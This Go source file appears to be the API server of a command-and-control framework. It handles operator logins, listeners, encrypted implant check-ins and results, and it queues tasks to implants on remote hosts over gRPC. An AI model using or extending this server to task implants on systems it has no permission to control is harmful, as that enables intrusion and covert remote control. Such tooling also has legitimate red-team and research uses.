package main

import (
	"../dao"
	"../helpers"
	"../messages"
	"../protobuf"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	sha2562 "crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"github.com/gorilla/mux"
	uuid "github.com/satori/go.uuid"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"sync"
	"time"
)

// Lock
var mutexLockTasks =				&sync.Mutex{}
var mutexLockListeners =		 	&sync.Mutex{}
var mutexLockClientStreamTasks = 	&sync.Mutex{}
var mutexLockClientStreamImplants = &sync.Mutex{}

// Define a server object
type Server struct {
	dao 		   		dao.DAO
	address 	   		string
	gRPCAddress    		string
	activeTasks    		[]messages.Task
	logPath 	   		string
	clientTaskStream 	map[string]protomessages.GetTaskResult_GetTaskResultServer 			     // The stream used to send tasks back to the client
	clientImplantStream map[string]protomessages.GetImplantCheckIn_GetImplantCheckInServer   	 // The stream used to send implant check-ins back to the client
	listenerStream      map[uuid.UUID]protomessages.GetTaskForListener_GetTaskForListenerServer  // The stream used to send tasks to the listener
}


// Function to retrieve command line options
func getOpt() (string, string, string, string, string, string, string, string, string) {
	ip := flag.String("i", "localhost", "API Server IP Address")
	port := flag.String("p", "9002", "API Server Port number")
	gRPCIP := flag.String("g", "localhost", "Address to bind the gRPC API")
	gRPCPort := flag.String("P", "9003", "Port to bind the gRPC API")
	caPath := flag.String("a", "../certs/ca/ca.crt", "Path to the CA certificate")
	certPath := flag.String("c", "../certs/server/server.crt", "Path to the TLS Server certificate")
	keyPath := flag.String("k", "../certs/server/server.key", "Path to the TLS Private key")
	dbPath := flag.String("d", "theconqueror.sqlite", "Path to the SQLite Database")
	logFilePath := flag.String("l", "theconqueror.log", "Path to the log file")
	flag.Parse()

	return *ip, *port, *gRPCIP, *gRPCPort, *caPath, *certPath, *keyPath, *dbPath, *logFilePath
}

// Handler to register a new operator
func (serverAPI *Server) registerOperator(writer http.ResponseWriter, request *http.Request) {

	var result messages.Message
	var loginData messages.NewOperator

	writer.Header().Set("Content-Type", "application/json")

	decoder := json.NewDecoder(request.Body)
	err := decoder.Decode(&loginData)
	// If there is an error exit from the function
	if err != nil {
		writer.WriteHeader(400)
		result.Message = "Format is not valid"

	} else {
		request.Body.Close()

		// Check if the credentials belong to an Administrator
		// Hash admin password
		hash := sha2562.New()
		hash.Write([]byte(loginData.AdminPassword))
		hashedPassword := hex.EncodeToString(hash.Sum(nil))
		if !serverAPI.dao.AdminLogin(loginData.AdminUsername, hashedPassword) {
			writer.WriteHeader(401)
			result.Message = "You need to be an administrator to register a new operator"
		} else {
			// Insert the new operator into the DB
			// Store the credentials as hashed values
			sha256 := sha2562.New()
			sha256.Write([]byte(loginData.NewPassword))
			hashedPassword := hex.EncodeToString(sha256.Sum(nil))
			err = serverAPI.dao.InsertNewOperator(loginData.NewUsername, hashedPassword)
			if err != nil {
				writer.WriteHeader(401)
				result.Message = err.Error()
			} else {
				writer.WriteHeader(200)
				result.Message = "Successfully created a new operator, you can now login to retrieve its API Key"
			}
		}
	}
	// Marshal the message and send it
	resultJSON, err := json.Marshal(result)
	if err != nil {
		log.Printf("Error: %s", err.Error())
	}
	writer.Write(resultJSON)
}

// Handler for client login
func (serverAPI *Server) apiLogin(writer http.ResponseWriter, request *http.Request) {

	defer request.Body.Close()
	writer.Header().Set("Content-Type", "application/json")

	var result messages.Message
	var loginData messages.Login

	decoder := json.NewDecoder(request.Body)
	err := decoder.Decode(&loginData)
	if err != nil {
		writer.WriteHeader(400)
		result.Message = err.Error()
		log.Printf("Error: %s", err.Error())
	} else {
		apiKey, err := serverAPI.dao.Login(loginData.Username, loginData.Password)
		if err != nil {
			result.Message = err.Error()
			log.Printf("Error: %s", err.Error())
			writer.WriteHeader(401)
		} else if apiKey == "" {
			writer.WriteHeader(401)
			result.Message = "The credentials are not valid"
		} else {
			// Update login status
			err := serverAPI.dao.UpdateLogin(1, apiKey)
			if err != nil {
				log.Printf("Error: %v", err)
			}
			writer.WriteHeader(200)
			result.Message = apiKey
		}
	}

	resultJSON, _ := json.Marshal(result)
	writer.Write(resultJSON)
	request.Body.Close()
}

// Handler for client logout
func (serverAPI *Server) apiLogout(writer http.ResponseWriter, request *http.Request) {

	defer request.Body.Close()

	// Validate API Key
	valid := serverAPI.validateAPIKey(request)
	if !valid {
		writer.WriteHeader(403)
		return
	}

	apiKey, err := request.Cookie("APIKEY")
	if err != nil {
		log.Printf("Error: %v", err)
		return
	}

	err = serverAPI.dao.UpdateLogin(0, apiKey.Value)
	if err != nil {
		log.Printf("Error: %v", err)
		writer.WriteHeader(500)
	} else {
		writer.WriteHeader(200)
	}
}

// Handler for listeners options: Create/Get/Delete
func (serverAPI *Server) listeners(writer http.ResponseWriter, request *http.Request) {

	defer request.Body.Close()
	writer.Header().Set("Content-Type", "application/json")
	var result messages.Message
	// Get the API Key
	apiKey, err := request.Cookie("APIKEY")
	if err != nil {
		log.Printf("Error: %s", err.Error())
		writer.WriteHeader(403)
		result.Message = "The API Key is missing"
		return
	} else {
		valid := serverAPI.dao.ValidateAPIKey(apiKey.Value)
		if valid != nil {
			writer.WriteHeader(403)
			result.Message = valid.Error()
			resultJSON, _ := json.Marshal(result)
			writer.Write(resultJSON)
			return
		}
	}

	switch request.Method {
	case "POST":
		// Decode request body
		decoder := json.NewDecoder(request.Body)
		var createListenerMessage messages.Listener
		err = decoder.Decode(&createListenerMessage)

		if err != nil {
			log.Printf("Error: %v", err)
			result.Message = err.Error()
			writer.WriteHeader(400)
			break
		}
		// Switch based on what type of listener we are creating
		// For now only http2 is implemented
		// For contributing with new listeners, the listener type and logic to save to DB can be added within this switch statement
		switch createListenerMessage.Type {
		case "http2":
			// Insert the data into the DB
			err = serverAPI.dao.InsertNewListener(
				createListenerMessage,
			)
			if err != nil {
				log.Printf("Error: %s", err.Error())
				writer.WriteHeader(500)
				result.Message = err.Error()
			} else {
				writer.WriteHeader(200)
				result.Message = "Successfully created a new listener"
			}
		case "REPLACE ME TO ADD NEW LISTENER":
			// New listeners logic go here
		}
	case "GET":
		// Get all listeners active
		activeListeners, err := serverAPI.dao.GetActiveListeners()
		if err != nil {
			writer.WriteHeader(500)
			result.Message = err.Error()
		} else {
			writer.WriteHeader(200)
			result.Message = activeListeners
		}
	case "DELETE":
		// Delete a listener and implant
		keys, ok := request.URL.Query()["listener_id"]
		if !ok || len(keys[0]) < 1 {
			writer.WriteHeader(500)
			result.Message = "Please include a listener UUID with the request"
		} else {
			listenerUUID := keys[0]
			err = serverAPI.dao.DeleteListener(listenerUUID)
			if err != nil {
				log.Printf("Error: %s", err.Error())
				writer.WriteHeader(500)
				result.Message = err.Error()
			} else {
				writer.WriteHeader(200)
				result.Message = "Successfully deleted listener " + listenerUUID
				log.Printf("INFO: Killed listener %s", listenerUUID)

				// Create task to kill listener
				killTask := messages.Task{
					Type:         "kill listener", // When killing a listener the implant will be killed to
					UUID:         uuid.Must(uuid.NewV4()),
					ListenerUUID: uuid.Must(uuid.FromString(listenerUUID)),
				}
				// Add the task to the DB
				err := serverAPI.dao.InsertTask(killTask)
				if err != nil {
					log.Printf("Error: %v", err)
					fmt.Println(err)
				}
				// Get the implant so we can set it to not active on the DB
				implant, err := serverAPI.dao.GetImplant(listenerUUID)
				if err != nil {
					helpers.NicePrinting("info", "The listener has no implants associated")
				} else if implant.Type != "" {
					// Delete from DB
					err := serverAPI.dao.DeleteImplant(implant.UUID.String())
					if err != nil {
						helpers.NicePrinting("info", "Failed to kill implant: " + err.Error())
					} else {
						log.Printf("INFO: Removed implant %s from DB", implant.UUID.String())
					}
				} else {
					helpers.NicePrinting("info", "The listener has no implants associated")
				}

				mutexLockListeners.Lock()
				for UUID, stream := range serverAPI.listenerStream {
					if UUID == killTask.ListenerUUID {
						if err := stream.Send(&protomessages.Task{
							Type:         killTask.Type,
							ListenerUUID: &protomessages.UUID{Value: killTask.ListenerUUID.String()},
							ImplantUUID:  &protomessages.UUID{Value: killTask.ImplantUUID.String()},
							Uuid:         &protomessages.UUID{Value: killTask.UUID.String()},
						}); err != nil {
							log.Printf("Error: %v", err.Error())
							writer.WriteHeader(500)
							return
						}
					}
				}
				mutexLockListeners.Unlock()
			}
		}
	}

	// Send response back
	resultJSON, _ := json.Marshal(result)
	writer.Write(resultJSON)
}

// Method to retrieve a Listener info
func (serverAPI *Server) getListener(writer http.ResponseWriter, request *http.Request) {

	// Validate API Key
	valid := serverAPI.validateAPIKey(request)
	if !valid {
		writer.WriteHeader(403)
		return
	}

	// Get the parameters in the URL
	params := mux.Vars(request)
	listenerUUID := params["id"]

	var result messages.Message

	// Get the listener from the DB
	listener, err := serverAPI.dao.GetListener(listenerUUID)
	if err != nil {
		log.Printf("Error: %v", err)
		result.Message = err.Error()
		writer.WriteHeader(500)
	} else {
		// Check if listener is not null
		if listener.Type == "" {
			log.Printf("Error: Request for a listener not valid from %s", request.RemoteAddr)
			result.Message = "There is no listener with that UUID"
			writer.WriteHeader(400) // Find a more suitable response code maybe
		} else {
			writer.WriteHeader(200)
			result.Message = listener

		}
	}
	// Send the result
	resultJSON, _ := json.Marshal(result)
	writer.Header().Set("Content-Type", "application/json")
	writer.Write(resultJSON)
}

// Handler for listeners to check in and retrieve a task for the implant and to delete an implant
func (serverAPI *Server) implants(writer http.ResponseWriter, request *http.Request) {

	writer.Header().Set("Content-Type", "application/json")

	switch request.Method {
	case "POST":
		decoder := json.NewDecoder(request.Body)
		// Get the message
		var listenerMessage messages.C2Message
		err := decoder.Decode(&listenerMessage)
		if err != nil {
			log.Printf("Error: %s", err.Error())
			writer.WriteHeader(400)
			return
		}

		// Here you can add the logic for different listeners types
		switch listenerMessage.ListenerType{
		case "http2":
			// If is a check in from the listener it will not need decrypting
			if listenerMessage.Type == "check-in" {
				task, err := serverAPI.dao.GetTaskForListener(listenerMessage.ListenerUUID)
				if err != nil {
					fmt.Println(err)
					log.Printf("Error: %v", err)
					writer.WriteHeader(204)
					break
				}
				// If empty
				if task.Type == "" {
					writer.WriteHeader(204)
					break
				}

				// Convert task to JSON and send it
				JSONTask, err := json.Marshal(task)
				if err != nil {
					writer.WriteHeader(500)
					log.Printf("Error: %s", err.Error())
					break
				}
				writer.WriteHeader(200)
				writer.Write(JSONTask)

				log.Printf("Listener " + listenerMessage.ListenerUUID.String() + " checked in")
				break
			}

			// Get HMAC and AES Key
			AESKey, HMACKey, err := serverAPI.dao.GetEncryptionKeys(listenerMessage.ListenerUUID.String())

			if err != nil {
				log.Printf("Error: %s", err.Error())
				writer.WriteHeader(500)
				return
			}

			// Check HMAC
			if !serverAPI.computeHMAC(listenerMessage.HMAC, listenerMessage.Message.(string), HMACKey) {
				helpers.NicePrinting("fail", "Failed to compute HMAC")
				log.Printf("Error: Failed to compute HMAC from %s", request.RemoteAddr)
				helpers.NicePrinting("info", listenerMessage.HMAC)
				writer.WriteHeader(403)
				return
			}

			// Decrypt the message
			decryptedMessage := serverAPI.decryptMessage(listenerMessage.Message.(string), AESKey)
			decryptedMessageBytes, err := base64.StdEncoding.DecodeString(string(decryptedMessage))
			if err != nil {
				writer.WriteHeader(400)
				log.Printf("Error: %s", err.Error())
				helpers.NicePrinting("fail", err.Error())
				return
			}

			// Switch based on what message type we received
			switch listenerMessage.Type {
			case "first checkin":
				// Will insert implant details into the DB
				// Decode message
				var implantDetails messages.Implant
				err = json.Unmarshal(decryptedMessageBytes, &implantDetails)

				if err != nil {
					fmt.Println(err.Error())
					writer.WriteHeader(400)
					break
				}

				log.Printf("IMPLANT FIRST CHECK-IN  - UUID %s", implantDetails.UUID.String())
				// Insert the details in the DB
				err = serverAPI.dao.InsertImplantData(implantDetails)
				if err != nil {
					log.Printf("ERROR: %v", err)
					break
				}
				helpers.NicePrinting("plus", "Implant " + implantDetails.UUID.String() + " checked in")

				// Send the implant check-in to all clients connected
				mutexLockClientStreamImplants.Lock()
				for _, stream := range serverAPI.clientImplantStream {
					if err = stream.Send(&protomessages.Implant{
						Uuid:           &protomessages.UUID{Value: implantDetails.UUID.String()},
						Cwd:            implantDetails.CWD,
						Os:             implantDetails.OS,
						Arch:           implantDetails.Arch,
						Jitter:         int64(implantDetails.Jitter),
						UserID:         implantDetails.UserID,
						Hostname:       implantDetails.Hostname,
						FailedCheckIns: int64(implantDetails.FailedCheckIn),
						PID:            int64(implantDetails.PID),
						PPID:           int64(implantDetails.PPID),
						MaxRetry:       int64(implantDetails.MaxRetry),
						Username:       implantDetails.Username,
						SleepTime:      int64(implantDetails.SleepTime),
						KillDate:       implantDetails.KillDate,
						ListenerUUID:   &protomessages.UUID{Value: implantDetails.ListenerUUID.String()},
						Status:         implantDetails.Status,
						Type:           implantDetails.Type,
					}); err != nil {
						log.Printf("Error: %v", err)
					}
				}
				mutexLockClientStreamImplants.Unlock()
			case "result":
				// Take the result
				var taskResult messages.Task
				err = json.Unmarshal(decryptedMessageBytes, &taskResult)
				if err != nil {
					fmt.Println(err.Error())
					log.Printf("Error: %v", err)
					writer.WriteHeader(400)
					break
				}
				log.Printf("INFO: Result for task %s", taskResult.UUID)

				// Anti replay attacks
				// The same db call to get a task for a client can be used here as it will return a completed task given a UUID
				_, err := serverAPI.dao.GetTask(taskResult.UUID)
				if err != nil {
					// This task was sent again
					if err.Error() != ("There is not task " + taskResult.UUID.String()) {
						log.Printf("Alert: %v sent a task result which was already recorded on the system!", request.RemoteAddr)
						break
					} else {
						// What do we do here? There shouldn't be an error anyways
						log.Printf("Error: %v", err)
					}
				}

				// Insert the details in the DB
				err = serverAPI.dao.UpdateTaskResult(taskResult)
				if err != nil {
					log.Printf("ERROR: %v", err)
				}
				// If there is an option change then we need to record it into the DB
				if taskResult.Type == "set" {
					err := serverAPI.dao.UpdateImplantDetails(
						taskResult.Args[0],
						taskResult.Args[1],
						taskResult.ImplantUUID.String(),
					)
					if err != nil {
						log.Printf("Error: %v", err)
					}
				}

				// Send the task result to all clients
				mutexLockClientStreamTasks.Lock()
				for _, stream := range serverAPI.clientTaskStream {
					if err = stream.Send(&protomessages.Task{
						Type:         taskResult.Type,
						Arguments:    taskResult.Args,
						Result:       taskResult.Result,
						Success:      taskResult.Success,
						ListenerUUID: &protomessages.UUID{Value: taskResult.ListenerUUID.String()},
						ImplantUUID:  &protomessages.UUID{Value: taskResult.ImplantUUID.String()},
						Uuid:         &protomessages.UUID{Value: taskResult.UUID.String()},
						Date:         taskResult.Date,
					}); err != nil {
						log.Printf("Error: %v", err)
					}
				}
				mutexLockClientStreamTasks.Unlock()

			case "implant shutdown":
				var task messages.Task
				err := json.Unmarshal(decryptedMessageBytes, &task)
				if err != nil {
					writer.WriteHeader(500)
					log.Printf("Error %v", err)
					break
				}
				err = serverAPI.dao.DeleteImplant(task.ImplantUUID.String())
				if err != nil {
					writer.WriteHeader(500)
					log.Printf("Error: %v", err)
					break
				}
				log.Printf("INFO: Implant %s shutdown", task.ImplantUUID.String())
				writer.WriteHeader(200)
			}
		}
	case "DELETE":
		var result messages.Message
		// Get the API Key
		apiKey, err := request.Cookie("APIKEY")
		if err != nil {
			log.Printf("Error: %s", err.Error())
			writer.WriteHeader(403)
			result.Message = "The API Key is missing"
		} else {
			valid := serverAPI.dao.ValidateAPIKey(apiKey.Value)
			if valid != nil {
				writer.WriteHeader(403)
				result.Message = valid.Error()
			} else {
				// Delete a listener and implant
				keys, ok := request.URL.Query()["implant_id"]
				if !ok || len(keys[0]) < 1 {
					writer.WriteHeader(500)
					result.Message = "Please include an UUID with the request"
					log.Printf("Error: Could not get the implant id from %s", request.RemoteAddr)
				} else {
					implantUUID := keys[0]
					// Get the listener UUID for the implant from the DB
					listenerUUID, err := serverAPI.dao.GetListenerUUIDFromImplantUUID(implantUUID)
					if err != nil {
						writer.WriteHeader(500)
						result.Message = err.Error()
						log.Printf("Error :%v", err)
					} else {
						// Delete from the DB
						err := serverAPI.dao.DeleteImplant(implantUUID)
						if err != nil {
							result.Message = err.Error()
							writer.WriteHeader(500)
							log.Printf("Error: %v", err)
						} else {
							// Create a task to delete the Implant
							deleteTask := messages.Task{
								Type:	"kill implant",
								UUID:   uuid.Must(uuid.NewV4()),
								ListenerUUID: uuid.Must(uuid.FromString(listenerUUID)),
								ImplantUUID:  uuid.Must(uuid.FromString(implantUUID)),
							}
							err := serverAPI.dao.InsertTask(deleteTask)
							if err != nil {
								log.Printf("Error: %v", err)
								fmt.Println(err)
								writer.WriteHeader(500)
								break
							}

							log.Printf("Deleted Implant %s", implantUUID)
							result.Message = "Deleted implant " + implantUUID
							// Send the task to the listener
							mutexLockListeners.Lock()
							for UUID, stream := range serverAPI.listenerStream {
								if UUID == deleteTask.ListenerUUID {
									if err := stream.Send(&protomessages.Task{
										Type:         deleteTask.Type,
										ListenerUUID: &protomessages.UUID{Value: deleteTask.ListenerUUID.String()},
										ImplantUUID:  &protomessages.UUID{Value: deleteTask.ImplantUUID.String()},
										Uuid:         &protomessages.UUID{Value: deleteTask.UUID.String()},
									}); err != nil {
										log.Printf("Error: %v", err.Error())
										break
									}
								}
							}
							mutexLockListeners.Unlock()
						}
					}
				}
			}
		}
		writer.Header().Set("Content-Type", "application/json")
		JSONResult, err := json.Marshal(result)
		if err != nil {
			writer.WriteHeader(500)
			log.Printf("Error: %v", err)
			return
		}
		writer.WriteHeader(200)
		writer.Write(JSONResult)
	}
}

// Func to retrieve task result for client
func (serverAPI *Server) getTaskResult(writer http.ResponseWriter, request *http.Request) {
	// Check API Key
	valid := serverAPI.validateAPIKey(request)
	if !valid {
		writer.WriteHeader(403)
		return
	}

	// Get the parameters in the URL
	params := mux.Vars(request)
	taskUUID := params["id"]

	parsedTaskUUID, err := uuid.FromString(taskUUID)
	if err != nil {
		writer.WriteHeader(400)
		log.Printf("ERROR: %v", err)
		return
	}

	task, err := serverAPI.dao.GetTask(parsedTaskUUID)
	if err != nil {
		if err.Error() == ("There is no task " + parsedTaskUUID.String()) {
			writer.WriteHeader(204)
			return
		}
		log.Printf("Error %v", err)
		// There are no tasks
		writer.WriteHeader(204)
		return
	}
	JSONTask, err := json.Marshal(task)
	if err != nil {
		writer.WriteHeader(500)
		return
	}
	writer.Header().Set("Content-Type", "application/json")
	writer.WriteHeader(200)
	writer.Write(JSONTask)
}

// Method to handle tasks from the client
func (serverAPI *Server) tasking(writer http.ResponseWriter, request *http.Request) {
	// Check API Key
	valid := serverAPI.validateAPIKey(request)
	if !valid {
		writer.WriteHeader(403)
		return
	}

	// Decode the task
	decoder := json.NewDecoder(request.Body)
	var task messages.Task
	err := decoder.Decode(&task)
	if err != nil {
		writer.WriteHeader(500)
	} else {
		// Use lock
		mutexLockTasks.Lock()
		// Insert the task into the DB
		err := serverAPI.dao.InsertTask(task)
		if err != nil {
			log.Printf("Error: %v", err)
			fmt.Println(err)
		}
		mutexLockTasks.Unlock()

		// Send the task to the listener
		mutexLockListeners.Lock()
		for UUID, stream := range serverAPI.listenerStream {
			if UUID == task.ListenerUUID {
				if err := stream.Send(&protomessages.Task{
					Type:         task.Type,
					Arguments:    task.Args,
					Result:       task.Result,
					Success:      task.Success,
					ListenerUUID: &protomessages.UUID{Value: task.ListenerUUID.String()},
					ImplantUUID:  &protomessages.UUID{Value: task.ImplantUUID.String()},
					Uuid:         &protomessages.UUID{Value: task.UUID.String()},
					Date:         task.Date,
				}); err != nil {
					log.Printf("Error: %v", err.Error())
					writer.WriteHeader(500)
					return
				}
			}
		}
		mutexLockListeners.Unlock()
		writer.WriteHeader(200)
	}
}

// Method to automate the API key validation for requests incoming from the client
func (serverAPI *Server) validateAPIKey(request *http.Request) bool {
	// Get and check API Key
	APIKey, err := request.Cookie("APIKEY")
	if err != nil {
		log.Printf("Error: %v", err)
		return false
	}
	valid := serverAPI.dao.ValidateAPIKey(APIKey.Value)
	if valid != nil {
		log.Printf("Error: API Key not valid from %s", request.RemoteAddr)
		return false
	}
	return true
}

// Method to retrieve all active implants
func (serverAPI *Server) allImplantsStatus(writer http.ResponseWriter, request *http.Request) {

	var result messages.Message
	writer.Header().Set("Content-Type", "application/json")

	// Get and check API Key
	APIKey, err := request.Cookie("APIKEY")
	if err != nil {
		writer.WriteHeader(403)
		log.Printf("Error: %v", err)
		result.Message = err.Error()
	} else {
		valid := serverAPI.dao.ValidateAPIKey(APIKey.Value)
		if valid != nil {
			writer.WriteHeader(403)
			log.Printf("Error: API Key not valid from %s", request.RemoteAddr)
			result.Message = "The API Key is not valid"
		} else {
			// Get implants from DB
			implants, err := serverAPI.dao.GetActiveImplants()
			if err != nil {
				writer.WriteHeader(500)
				log.Printf("Error: %v", err)
				result.Message = err.Error()
			} else if len(implants) == 0 {
				writer.WriteHeader(500)
				result.Message = "There are no active implants"
				log.Printf("Info: request for active implants from %s returned no result", request.RemoteAddr)
			} else {
				result.Message = implants
				writer.WriteHeader(200)
			}
		}
	}
	// Marshal to JSON and send response
	resultJSON, _ := json.Marshal(result)
	writer.Write(resultJSON)
}

// Endpoint for client to check if an implant has checked in
func (serverAPI *Server) implantStatus(writer http.ResponseWriter, request *http.Request) {
	// Get and check API Key
	APIKey, err := request.Cookie("APIKEY")
	if err != nil {
		writer.WriteHeader(403)
		log.Printf("Error: %v", err)
		return
	}
	valid := serverAPI.dao.ValidateAPIKey(APIKey.Value)
	if valid != nil {
		writer.WriteHeader(403)
		log.Printf("Error: API Key not valid from %s", request.RemoteAddr)
		return
	}

	// Get the parameters in the URL
	params := mux.Vars(request)
	listenerUUID := params["id"]

	// Get the implant from the DB
	implant, err := serverAPI.dao.GetImplant(listenerUUID)
	if err != nil  {
		log.Printf("Error: %v", err)
		writer.WriteHeader(500)
		return
	}

	if implant.Status != "Active" {
		writer.WriteHeader(204)
		return
	}

	JSONImplant, err := json.Marshal(implant)
	if err != nil {
		log.Printf("Error: %v", err)
		writer.WriteHeader(500)
		return
	}
	writer.WriteHeader(200)
	writer.Header().Set("Content-Type", "application/json")
	writer.Write(JSONImplant)
}

// Method to compute HMAC
func (serverAPI *Server) computeHMAC(signature, message, HMACKey string) bool {
	mac := hmac.New(sha2562.New, []byte(HMACKey))
	mac.Write([]byte(message))
	expectedMac := mac.Sum(nil)
	return signature == hex.EncodeToString(expectedMac)
}

// Method to decrypt the implant message
func (serverAPI *Server) decryptMessage(messageS string, key string) []byte {

	ciph, err := aes.NewCipher([]byte(key))
	if err != nil {
		fmt.Println(err.Error())
		return nil
	}

	gcm, err := cipher.NewGCM(ciph)
	if err != nil {
		fmt.Println(err.Error())
		return nil
	}

	message, err := base64.RawStdEncoding.DecodeString(messageS)

	if err != nil {
		fmt.Println(err.Error())
		return nil
	}

	nonceSize := gcm.NonceSize()
	nonce, ciphertext := message[:nonceSize], message[nonceSize:]
	plainText, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		fmt.Println(err.Error())
		return nil
	}
	return plainText
}

// Method to return a task matching the listener UUID
func (serverAPI *Server) extractTaskFromListenerUUID(listenerUUID uuid.UUID) (messages.Task, int) {
	// Loop through all tasks and check the UUID for matches
	for index, task := range serverAPI.activeTasks {
		if task.ListenerUUID == listenerUUID {
			return task, index
		}
	}
	// If there are none return an empty task and the index -1
	return messages.Task{}, -1
}

// Method to receive exit message from Implant
func (serverAPI *Server) killImplant(writer http.ResponseWriter, request *http.Request) {
	// Get the parameters in the URL
	params := mux.Vars(request)
	implantUUID := params["id"]

	// Delete the implant from the DB
	err := serverAPI.dao.DeleteImplant(implantUUID)
	if err != nil {
		writer.WriteHeader(500)
		return
	}
	log.Printf("INFO: Implant %s shut down", implantUUID)
	writer.WriteHeader(200)
}

// Method to receive exit message from listener
func (serverAPI *Server) killListener(writer http.ResponseWriter, request *http.Request) {
	// Get the parameters in the URL
	params := mux.Vars(request)
	listenerUUID := params["id"]

	// Delete the implant from the DB
	err := serverAPI.dao.DeleteImplant(listenerUUID)
	if err != nil {
		writer.WriteHeader(500)
		return
	}
	log.Printf("INFO: Listener %s shut down", listenerUUID)
	implant, err := serverAPI.dao.GetImplant(listenerUUID)
	if err != nil {
		writer.WriteHeader(500)
		return
	}
	err = serverAPI.dao.DeleteImplant(implant.UUID.String())
	if err != nil {
		writer.WriteHeader(500)
		return
	}
	log.Printf("INFO: Implant %s shut down", implant.UUID.String())
	writer.WriteHeader(200)
}

//gRPC service to get implant check in
func (serverAPI *Server) GetImplantCheckIn(username *protomessages.Username, stream protomessages.GetImplantCheckIn_GetImplantCheckInServer)  error {
	serverAPI.clientImplantStream[username.Username] = stream
	for {
		time.Sleep(time.Second *60)
	}
}

// gRPC service to get task for listener
func (serverAPI *Server) GetTaskForListener(UUID *protomessages.UUID, stream protomessages.GetTaskForListener_GetTaskForListenerServer)  error {
	serverAPI.listenerStream[uuid.Must(uuid.FromString(UUID.Value))] = stream
	for {
		time.Sleep(time.Second *60)
	}
}

//Service to get a task results
func (serverAPI *Server) GetTaskResult(username *protomessages.Username, stream protomessages.GetTaskResult_GetTaskResultServer) error {
	serverAPI.clientTaskStream[username.Username] = stream
	for {
		time.Sleep(time.Second *60)
	}
}

func main() {

	// Print banner
	helpers.ServerBanner()

	// Get command line options
	IP, port, gRPCIP, gRPCPort, caPath, certificatePath, certificateKeyPath, databasePath, logPath := getOpt()

	if IP == "" {
		helpers.ExitOnError("Please insert the IP to listen on")
	}

	if port == "" {
		helpers.ExitOnError("Please insert the port to bind to")
	}

	if gRPCIP == "" {
		helpers.ExitOnError("Please insert the IP to bind the gRPC API to")
	}

	if gRPCPort == "" {
		helpers.ExitOnError("Please insert the port to bind the gRPC API to")
	}

	if caPath == "" {
		helpers.ExitOnError("Please insert the path to the CA certificate")
	}

	if certificateKeyPath == "" {
		helpers.ExitOnError("Please insert the path to the TLS certificate private key")
	}

	if certificatePath == "" {
		helpers.ExitOnError("Please insert the path to the TLS certificate")
	}

	if databasePath == "" {
		helpers.ExitOnError("Please insert the path to the SQLIte database file")
	}

	if logPath == "" {
		helpers.ExitOnError("Please insert the path to the log file")
	}

	// Create the API server object
	serverAPI := Server{
		address:			 IP + ":" + port,
		logPath:        	 logPath,
		dao:            	 dao.DAO{DBPath:databasePath},
		gRPCAddress:    	 gRPCIP + ":" + gRPCPort,
		clientImplantStream: make(map[string]protomessages.GetImplantCheckIn_GetImplantCheckInServer),
		clientTaskStream:    make(map[string]protomessages.GetTaskResult_GetTaskResultServer),
		listenerStream:      make(map[uuid.UUID]protomessages.GetTaskForListener_GetTaskForListenerServer),
	}

	file, err := os.OpenFile(serverAPI.logPath, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
	if err != nil {
		log.Fatalf("Error opening file: %v", err)
	}

	defer file.Close()
	log.SetOutput(file)

	// Create MUX router
	router := mux.NewRouter()

	// Define all endpoints and their handlers
	// Client - Server
	router.HandleFunc("/api/login", serverAPI.apiLogin).Methods("POST")
	router.HandleFunc("/api/logout", serverAPI.apiLogout).Methods("GET")
	router.HandleFunc("/api/listeners", serverAPI.listeners).Methods("GET", "POST", "DELETE")
	router.HandleFunc("/api/listeners/{id}", serverAPI.getListener).Methods("GET")
	router.HandleFunc("/api/implants/status", serverAPI.allImplantsStatus).Methods("GET")
	router.HandleFunc("/api/implants/tasks", serverAPI.tasking).Methods("POST")
	router.HandleFunc("/api/implants/tasks/{id}", serverAPI.getTaskResult).Methods("GET")
	router.HandleFunc("/api/implants/status/{id}", serverAPI.implantStatus).Methods("GET")
	// Listener - Server
	router.HandleFunc("/api/implants", serverAPI.implants).Methods("POST", "DELETE")
	router.HandleFunc("/api/implants/kill/{id}", serverAPI.killImplant).Methods("DELETE")
	router.HandleFunc("/api/listeners/kill/{id}", serverAPI.killListener).Methods("DELETE")
	// Web interface - Server
	router.HandleFunc("/admin/register", serverAPI.registerOperator).Methods("POST")

	// MTLS
	certificate, err := tls.LoadX509KeyPair(certificatePath, certificateKeyPath)
	if err != nil {
		log.Fatalf("Error: %v", err)
	}
	// Load CA
	caCert, err := ioutil.ReadFile(caPath)
	if err != nil {
		log.Fatalf("Error: %v", err)
	}
	caCertPool := x509.NewCertPool()
	caCertPool.AppendCertsFromPEM(caCert)

	// gRPC TLS config
	creds := credentials.NewTLS(&tls.Config{
		Certificates: []tls.Certificate{certificate},
		ClientCAs:    caCertPool,
		ClientAuth:   tls.RequireAndVerifyClientCert,
	})

	// gRPC server options
	opts := []grpc.ServerOption{grpc.Creds(creds)}
	grpcServer := grpc.NewServer(opts...)

	// Register gRPC endpoints

	config := &tls.Config {
		Certificates:	[]tls.Certificate{certificate},
		MinVersion:     tls.VersionTLS12,
		NextProtos:		[]string{"h2"},
		ClientAuth:     tls.RequireAndVerifyClientCert,
		ClientCAs:      caCertPool,
	}

	// Create a server object
	apiServer := &http.Server {
		Addr:		serverAPI.address,
		Handler: 	router,
		TLSConfig: 	config,
	}

	listener, err := net.Listen("tcp", serverAPI.gRPCAddress)

	// Register gRPC services
	protomessages.RegisterGetImplantCheckInServer(grpcServer, &serverAPI)
	protomessages.RegisterGetTaskForListenerServer(grpcServer, &serverAPI)
	protomessages.RegisterGetTaskResultServer(grpcServer, &serverAPI)

	go func() {
		// Start the gRPC server
		if err := grpcServer.Serve(listener); err != nil {
			log.Fatalf("Fatal error: %v", err)
		}
	}()
	// Start the API server
	go log.Fatal(apiServer.ListenAndServeTLS(certificatePath, certificateKeyPath))
}

